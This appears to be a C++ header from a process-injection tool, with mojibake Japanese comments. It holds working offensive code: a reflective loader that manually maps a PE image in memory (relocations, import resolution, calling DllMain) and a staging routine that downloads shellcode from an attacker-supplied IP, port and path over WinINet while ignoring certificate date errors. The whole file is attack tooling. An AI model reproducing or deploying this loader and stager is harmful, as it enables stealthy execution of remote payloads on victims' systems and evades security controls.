#pragma once

#include "injector.h"



// ���ˌ^���[�_�[�֐�
 void __stdcall ReflectiveLoader(MANUAL_MAPPING_DATA* pData) {
    PBYTE baseAddress = pData->pBase;

    // PE�w�b�_�̐擪�A�h���X���擾
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(baseAddress);
    PIMAGE_NT_HEADERS pNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(baseAddress + reinterpret_cast<PIMAGE_DOS_HEADER>(pDosHeader)->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = &pNtHeader->OptionalHeader;

    // �֐��|�C���^�ϐ����`
    f_LoadLibraryA _LoadLibraryA = pData->pLoadLibraryA;
    f_GetProcAddress _GetProcAddress = pData->pGetProcAddress;
    f_DLL_ENTRY_POINT _DllMain = reinterpret_cast<f_DLL_ENTRY_POINT>(baseAddress + pOptionalHeader->AddressOfEntryPoint);

    // �x�[�X�A�h���X�̍������v�Z���čĔz�u�������s��
    PBYTE locationDelta = baseAddress - pOptionalHeader->ImageBase;
    if (locationDelta) {
        if (!pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) return;

        // �x�[�X�Ĕz�u���s��
        PIMAGE_BASE_RELOCATION pRelocData = reinterpret_cast<PIMAGE_BASE_RELOCATION>(baseAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        PIMAGE_BASE_RELOCATION pRelocEnd = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uintptr_t>(pRelocData) + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);

        // �Ĕz�u�f�[�^��K�p
        while (pRelocData < pRelocEnd && pRelocData->SizeOfBlock) {
            UINT AmountOfEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD pRelativeInfo = reinterpret_cast<PWORD>(pRelocData + 1);

            for (UINT i = 0; i != AmountOfEntries; ++i, ++pRelativeInfo) {
                if ((*pRelativeInfo >> 0x0C) == IMAGE_REL_BASED_DIR64) {
                    PUINT_PTR pPatch = reinterpret_cast<PUINT_PTR>(baseAddress + pRelocData->VirtualAddress + ((*pRelativeInfo) & 0xFFF));
                    *pPatch += reinterpret_cast<UINT_PTR>(locationDelta);
                }
            }
            pRelocData = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<PBYTE>(pRelocData) + pRelocData->SizeOfBlock);
        }
    }

    // IAT����
    if (pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(baseAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (pImportDescriptor->Name) {
            LPCSTR moduleName = reinterpret_cast<LPCSTR>(baseAddress + pImportDescriptor->Name);
            HINSTANCE moduleHandle = _LoadLibraryA(moduleName);
            PULONG_PTR pThunkRef = reinterpret_cast<PULONG_PTR>(baseAddress + pImportDescriptor->OriginalFirstThunk);
            PULONG_PTR pFuncRef = reinterpret_cast<PULONG_PTR>(baseAddress + pImportDescriptor->FirstThunk);

            if (!pThunkRef) pThunkRef = pFuncRef;

            // �֐��̃A�h���X����������
            for (; *pThunkRef; ++pThunkRef, ++pFuncRef) {
                if (IMAGE_SNAP_BY_ORDINAL(*pThunkRef)) {
                    // �I�[�f�B�i���ԍ�����֐����擾
                    *pFuncRef = reinterpret_cast<ULONG_PTR>(_GetProcAddress(moduleHandle, reinterpret_cast<char*>(*pThunkRef & 0xFFFF)));
                }
                else {
                    // ���O�Ŋ֐����擾
                    PIMAGE_IMPORT_BY_NAME pImport = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(baseAddress + (*pThunkRef));
                    *pFuncRef = reinterpret_cast<ULONG_PTR>(_GetProcAddress(moduleHandle, pImport->Name));
                }
            }
            ++pImportDescriptor;
        }
    }

    // �G���g���|�C���g�Ăяo��
    _DllMain(baseAddress, pData->fdwReasonParam, pData->reservedParam);
}

bool StagingPayload(const std::wstring& url, std::vector<BYTE>& shellcode) {

    // URL���J��
    HINTERNET internetHandle = InternetOpen(L"Shellcode Downloader", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    HINTERNET urlHandle = InternetOpenUrl(internetHandle, url.c_str(), nullptr, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE, 0);

    DWORD bytesRead;
    BYTE buffer[1024];

    // �y�C���[�h��ǂݍ��ރ��[�v
    while (true) {
        if (!InternetReadFile(urlHandle, buffer, sizeof(buffer), &bytesRead) || bytesRead == 0) {
            break;
        }

        // �ǂݍ��񂾃f�[�^���x�N�^�[�ɒǉ�
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
    }

    return !shellcode.empty();
}

// URL���\�z����֐�
std::wstring makeUrl(const Arg& arg) {
    return std::wstring(arg.protocol) + std::wstring(arg.ipAddress) + L":" + std::wstring(arg.port) + L"/" + std::wstring(arg.filePath);
}